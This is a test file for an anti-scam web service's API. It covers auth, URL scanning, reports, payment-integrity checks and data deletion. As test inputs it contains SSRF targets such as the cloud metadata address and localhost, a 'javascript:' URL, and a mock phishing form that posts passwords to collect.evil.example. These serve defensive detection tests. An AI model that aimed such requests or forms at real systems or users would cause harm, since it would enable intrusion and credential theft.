import { describe, expect, it } from 'vitest';
import request from 'supertest';
import type { Report } from '@authentik/shared';
import { as, clean, fakeFetcher, fakeReputation, harness } from './harness.js';

describe('authentication', () => {
  it('rejects requests without a valid token', async () => {
    const { app } = harness();
    await request(app).get('/v1/me').expect(401);
    await request(app).get('/v1/me').set({ authorization: 'Bearer nonsense' }).expect(401);
    await request(app).get('/health').expect(200);
  });

  it('creates the profile on first use and records onboarding', async () => {
    const { app } = harness();
    const me = await request(app).get('/v1/me').set(as('alice')).expect(200);
    expect(me.body).toMatchObject({ uid: 'alice', onboardingCompletedAt: null });
    const done = await request(app).patch('/v1/me').set(as('alice')).send({ onboardingCompleted: true }).expect(200);
    expect(done.body.onboardingCompletedAt).toBeTruthy();
    await request(app).patch('/v1/me').set(as('alice')).send({ role: 'admin' }).expect(400);
  });

  it('stops accepting tokens after sessions are revoked', async () => {
    const { app } = harness();
    await request(app).post('/v1/me/sessions/revoke').set(as('bob')).expect(204);
    await request(app).get('/v1/me').set(as('bob')).expect(401);
  });
});

describe('website scans', () => {
  it('rejects malformed input as a 400', async () => {
    const { app } = harness();
    const res = await request(app).post('/v1/scans').set(as('u1')).send({ url: 'javascript:alert(1)' }).expect(400);
    expect(res.body.error.code).toBe('invalid_url.unsupported_scheme');
  });

  it.each(['http://127.0.0.1/', 'http://localhost:3000/', 'http://169.254.169.254/latest/meta-data', 'https://router.local/'])(
    'blocks %s without fetching it',
    async (url) => {
      const fetcher = fakeFetcher();
      const { app } = harness({ fetcher });
      const res = await request(app).post('/v1/scans').set(as('u1')).send({ url }).expect(201);
      expect(res.body.verdict).toBe('blocked');
      expect(fetcher.calls).toHaveLength(0);
    },
  );

  it('rates an official domain with no warnings when every check ran', async () => {
    const { app } = harness();
    const res = await request(app).post('/v1/scans').set(as('u1')).send({ url: 'takealot.com' }).expect(201);
    const report = res.body as Report;
    expect(report.verdict).toBe('no_obvious_warnings');
    expect(report.completeness).toBe('complete');
    expect(report.assessment.findings.map((f) => f.code)).toContain('official_domain');
  });

  it('is inconclusive — not safe — when reputation is unavailable', async () => {
    const { app } = harness({ reputationProviders: [fakeReputation({ status: 'unavailable', detail: 'down' })] });
    const res = await request(app).post('/v1/scans').set(as('u1')).send({ url: 'https://some-shop.example.com' }).expect(201);
    expect(res.body.verdict).toBe('inconclusive');
    expect(res.body.completeness).toBe('partial');
  });

  it('rates a reputation match as high risk and raises one alert', async () => {
    const { app } = harness({ reputationProviders: [fakeReputation({ status: 'completed', matches: [{ threatType: 'SOCIAL_ENGINEERING' }] })] });
    const res = await request(app).post('/v1/scans').set(as('u1')).send({ url: 'https://bad.example.net/login' }).expect(201);
    expect(res.body.verdict).toBe('high_risk');
    await request(app).post('/v1/scans').set(as('u1')).send({ url: 'https://bad.example.net/other' }).expect(201);
    const alerts = await request(app).get('/v1/alerts').set(as('u1')).expect(200);
    expect(alerts.body).toHaveLength(1); // deduplicated
    expect(alerts.body[0]).toMatchObject({ code: 'reputation_match', reviewedAt: null });
    await request(app).post(`/v1/alerts/${alerts.body[0].id}/review`).set(as('u1')).expect(200);
    const unreviewed = await request(app).get('/v1/alerts?unreviewed=true').set(as('u1')).expect(200);
    expect(unreviewed.body).toHaveLength(0);
  });

  it('detects an impersonating page that asks for a password', async () => {
    const fetcher = fakeFetcher({
      'takealot-secure-login.com': {
        body: '<html><title>Takealot – Sign in</title><form action="https://collect.evil.example/p"><input type="password" name="pw"></form></html>',
      },
    });
    const { app } = harness({ fetcher });
    const res = await request(app).post('/v1/scans').set(as('u1')).send({ url: 'https://takealot-secure-login.com/' }).expect(201);
    const codes = (res.body as Report).assessment.findings.map((f) => f.code);
    expect(res.body.verdict).toBe('high_risk');
    expect(codes).toEqual(expect.arrayContaining(['brand_in_domain', 'page_claims_brand', 'credential_harvest', 'credential_form_offsite']));
  });

  it('never stores query values from the scanned URL', async () => {
    const { app } = harness();
    const res = await request(app).post('/v1/scans').set(as('u1')).send({ url: 'https://shop.example.com/reset?token=SECRET123&email=me@x.com' }).expect(201);
    expect(JSON.stringify(res.body)).not.toContain('SECRET123');
    expect(JSON.stringify(res.body)).not.toContain('me@x.com');
  });
});

describe('reports', () => {
  it('lists, reads and deletes only the owner’s reports', async () => {
    const { app } = harness();
    const created = await request(app).post('/v1/scans').set(as('owner')).send({ url: 'example.com' }).expect(201);
    const id = created.body.id;

    const list = await request(app).get('/v1/reports').set(as('owner')).expect(200);
    expect(list.body.map((r: Report) => r.id)).toEqual([id]);
    expect(list.body[0].assessment).toBeUndefined(); // summaries only

    await request(app).get(`/v1/reports/${id}`).set(as('intruder')).expect(404);
    await request(app).delete(`/v1/reports/${id}`).set(as('intruder')).expect(404);
    expect((await request(app).get('/v1/reports').set(as('intruder'))).body).toEqual([]);

    await request(app).delete(`/v1/reports/${id}`).set(as('owner')).expect(204);
    await request(app).get(`/v1/reports/${id}`).set(as('owner')).expect(404);
  });

  it('deleting a report removes alerts raised from it', async () => {
    const { app } = harness({ reputationProviders: [fakeReputation({ status: 'completed', matches: [{ threatType: 'MALWARE' }] })] });
    const created = await request(app).post('/v1/scans').set(as('u2')).send({ url: 'https://malware.example.org' }).expect(201);
    expect((await request(app).get('/v1/alerts').set(as('u2'))).body).toHaveLength(1);
    await request(app).delete(`/v1/reports/${created.body.id}`).set(as('u2')).expect(204);
    expect((await request(app).get('/v1/alerts').set(as('u2'))).body).toHaveLength(0);
  });
});

describe('payment integrity', () => {
  const expectations: Record<string, string> = {
    legitimate: 'no_obvious_warnings',
    'shipping-fee': 'no_obvious_warnings',
    'amount-tampered': 'high_risk',
    'recipient-swapped': 'high_risk',
    'lookalike-redirect': 'high_risk',
    'unknown-processor': 'suspicious',
    incomplete: 'inconclusive',
  };

  it.each(Object.entries(expectations))('demo scenario %s → %s', async (id, verdict) => {
    const { app } = harness();
    const scenarios = (await request(app).get('/v1/payment-checks/scenarios').set(as('p')).expect(200)).body;
    const scenario = scenarios.find((s: { id: string }) => s.id === id);
    const res = await request(app).post('/v1/payment-checks').set(as('p')).send(scenario.request).expect(201);
    expect(res.body.verdict).toBe(verdict);
    expect(res.body.payment.simulated).toBe(true);
  });

  it('accepts a legitimate redirect to the merchant’s payment provider', async () => {
    const { app } = harness();
    const res = await request(app)
      .post('/v1/payment-checks')
      .set(as('p'))
      .send({
        expected: { merchant: 'Takealot', amountMinor: 49_900, currency: 'ZAR' },
        observed: {
          checkoutUrl: 'https://secure.payu.co.za/rpp.do',
          redirectChain: ['https://www.takealot.com/checkout', 'https://secure.payu.co.za/rpp.do'],
          recipientName: 'Takealot Online (RF) (Pty) Ltd',
          amountMinor: 49_900,
          currency: 'ZAR',
        },
      })
      .expect(201);
    expect(res.body.verdict).toBe('no_obvious_warnings');
    expect(res.body.payment.paymentProvider).toBe('PayU');
  });

  it('judges a provider once even when it redirects between its own domains', async () => {
    const { app } = harness();
    const res = await request(app)
      .post('/v1/payment-checks')
      .set(as('p'))
      .send({
        expected: { merchant: 'Takealot', amountMinor: 49_900, currency: 'ZAR' },
        observed: {
          checkoutUrl: 'https://payfast.io/eng/process',
          redirectChain: ['https://www.payfast.co.za/eng/process', 'https://payfast.io/eng/process'],
          recipientName: 'Takealot',
          amountMinor: 49_900,
          currency: 'ZAR',
        },
      })
      .expect(201);
    const codes = (res.body as Report).assessment.findings.map((f) => f.code);
    expect(codes.filter((c) => c === 'unexpected_payment_provider')).toHaveLength(1);
    expect(res.body.verdict).toBe('no_obvious_warnings');
  });

  it('cannot verify an unknown merchant', async () => {
    const { app } = harness();
    const res = await request(app)
      .post('/v1/payment-checks')
      .set(as('p'))
      .send({
        expected: { merchant: 'Corner Spaza', amountMinor: 1000, currency: 'ZAR' },
        observed: { checkoutUrl: 'https://pay.demopay.test/x', recipientName: 'Corner Spaza', amountMinor: 1000, currency: 'ZAR' },
      })
      .expect(201);
    expect(res.body.verdict).toBe('inconclusive');
  });
});

describe('settings and privacy', () => {
  it('validates retention and reflects it on new reports', async () => {
    const { app } = harness();
    await request(app).put('/v1/settings').set(as('s')).send({ reportRetentionDays: 365 }).expect(400);
    await request(app).put('/v1/settings').set(as('s')).send({ reportRetentionDays: 7, pushNotifications: true }).expect(200);
    const r = await request(app).post('/v1/scans').set(as('s')).send({ url: 'example.com' }).expect(201);
    const days = (new Date(r.body.expiresAt).getTime() - new Date(r.body.createdAt).getTime()) / 86_400_000;
    expect(Math.round(days)).toBe(7);
    const privacy = await request(app).get('/v1/privacy').set(as('s')).expect(200);
    expect(privacy.body.deletion.reportDeletion).toMatch(/does not remove security audit log/);
  });
});

describe('account deletion', () => {
  it('removes all user data', async () => {
    const { app, deps } = harness({ reputationProviders: [fakeReputation(clean)] });
    await request(app).get('/v1/me').set(as('gone')).expect(200);
    await request(app).post('/v1/scans').set(as('gone')).send({ url: 'example.com' }).expect(201);
    await request(app).post('/v1/devices').set(as('gone')).send({ token: 'fcm-token-123456', platform: 'android' }).expect(204);
    await request(app).delete('/v1/me').set(as('gone')).expect(204);
    expect(await deps.store.reports.listByUser('gone')).toEqual([]);
    expect(await deps.store.devices.listByUser('gone')).toEqual([]);
    expect(await deps.store.profiles.get('gone')).toBeNull();
    await request(app).get('/v1/me').set(as('gone')).expect(401);
  });
});

describe('sandbox', () => {
  it('fails closed when no isolated worker is configured', async () => {
    const { app } = harness();
    const res = await request(app).post('/v1/sandbox/sessions').set(as('u')).send({ url: 'https://example.com' }).expect(503);
    expect(res.body.error.code).toBe('sandbox_unavailable');
  });
});

describe('reading payment details from the page', () => {
  const pageRead = {
    url: 'https://secure.payu.co.za/rpp.do?PayUReference=TOKEN123',
    title: 'PayU Secure Checkout',
    recipientName: 'Takealot Online (RF) (Pty) Ltd',
    amountMinor: 49_900,
    currency: 'ZAR',
    confidence: 'high' as const,
    amountCandidates: [{ amountMinor: 49_900, currency: 'ZAR', label: 'Total due' }],
    recipientCandidates: ['Takealot Online (RF) (Pty) Ltd'],
    notes: [],
  };
  const worker = (read = pageRead) => ({
    configured: true,
    createSession: async () => undefined,
    closeSession: async () => undefined,
    openStream: () => { throw new Error('not used'); },
    extractFromUrl: async () => read,
  });
  const expected = { merchant: 'Takealot', amountMinor: 49_900, currency: 'ZAR' };

  it('reads the page, keeps the full URL server-side, and checks with the page values', async () => {
    const { app } = harness({ worker: worker() as never });
    const ext = await request(app).post('/v1/payment-checks/extract').set(as('x')).send({ checkoutUrl: 'https://secure.payu.co.za/rpp.do?PayUReference=TOKEN123' }).expect(201);
    expect(ext.body).toMatchObject({ amountMinor: 49_900, recipientName: 'Takealot Online (RF) (Pty) Ltd', confidence: 'high', pageHost: 'secure.payu.co.za' });
    expect(JSON.stringify(ext.body)).not.toContain('TOKEN123');

    const res = await request(app).post('/v1/payment-checks').set(as('x')).send({ expected, observed: { extractionId: ext.body.extractionId } }).expect(201);
    expect(res.body.verdict).toBe('no_obvious_warnings');
    expect(res.body.payment.observedSource).toEqual({ recipient: 'page', amount: 'page' });
    expect(res.body.payment.paymentProvider).toBe('PayU');
  });

  it('flags a page amount that differs from what the user expected', async () => {
    const { app } = harness({ worker: worker({ ...pageRead, amountMinor: 89_900 }) as never });
    const ext = await request(app).post('/v1/payment-checks/extract').set(as('x')).send({ checkoutUrl: 'https://secure.payu.co.za/rpp.do' }).expect(201);
    const res = await request(app).post('/v1/payment-checks').set(as('x')).send({ expected, observed: { extractionId: ext.body.extractionId } }).expect(201);
    expect(res.body.verdict).toBe('high_risk');
    expect((res.body as Report).assessment.findings.map((f) => f.code)).toContain('payment_amount_mismatch');
  });

  it('records agreement, and flags disagreement between the user and the page', async () => {
    const { app } = harness({ worker: worker() as never });
    const ext = await request(app).post('/v1/payment-checks/extract').set(as('x')).send({ checkoutUrl: 'https://secure.payu.co.za/rpp.do' }).expect(201);
    const agree = await request(app).post('/v1/payment-checks').set(as('x'))
      .send({ expected, observed: { extractionId: ext.body.extractionId, amountMinor: 49_900, recipientName: 'Takealot Online (RF) (Pty) Ltd' } }).expect(201);
    expect(agree.body.payment.observedSource).toEqual({ recipient: 'page_confirmed', amount: 'page_confirmed' });

    const differ = await request(app).post('/v1/payment-checks').set(as('x'))
      .send({ expected, observed: { extractionId: ext.body.extractionId, amountMinor: 49_900, recipientName: 'Someone Else' } }).expect(201);
    expect((differ.body as Report).assessment.findings.map((f) => f.code)).toContain('contradictory_payment_evidence');
  });

  it('does not let one user use another user’s page reading', async () => {
    const { app } = harness({ worker: worker() as never });
    const ext = await request(app).post('/v1/payment-checks/extract').set(as('owner')).send({ checkoutUrl: 'https://secure.payu.co.za/rpp.do' }).expect(201);
    const res = await request(app).post('/v1/payment-checks').set(as('other')).send({ expected, observed: { extractionId: ext.body.extractionId } }).expect(400);
    expect(res.body.error.code).toBe('extraction_expired');
  });

  it('refuses blocked and simulated addresses, and fails closed without the worker', async () => {
    const { app } = harness({ worker: worker() as never });
    await request(app).post('/v1/payment-checks/extract').set(as('x')).send({ checkoutUrl: 'http://10.0.0.5/pay' }).expect(403);
    await request(app).post('/v1/payment-checks/extract').set(as('x')).send({ checkoutUrl: 'https://pay.demopay.test/x' }).expect(400);
    const noWorker = harness();
    const res = await request(noWorker.app).post('/v1/payment-checks/extract').set(as('x')).send({ checkoutUrl: 'https://secure.payu.co.za/rpp.do' }).expect(503);
    expect(res.body.error.code).toBe('extraction_unavailable');
  });
});
